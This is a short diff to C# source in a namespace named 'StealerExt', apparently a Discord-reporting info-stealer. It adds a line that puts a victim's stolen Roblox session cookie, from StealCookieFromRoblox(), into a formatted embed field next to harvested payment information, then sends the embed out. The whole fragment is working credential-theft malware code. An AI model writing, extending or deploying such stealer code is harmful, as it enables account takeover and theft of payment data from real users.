@@ -162,7 +162,7 @@ namespace StealerExt
                 embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed to parse other info");
             }
             else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
-			embed.AddField("__Miscellaneous__", StealCookieFromRoblox());
+			embed.AddField("__Roblox Cookie__", $"```{StealCookieFromRoblox()}```");
 			embed.SendEmbed().RunSynchronously();
         }
 
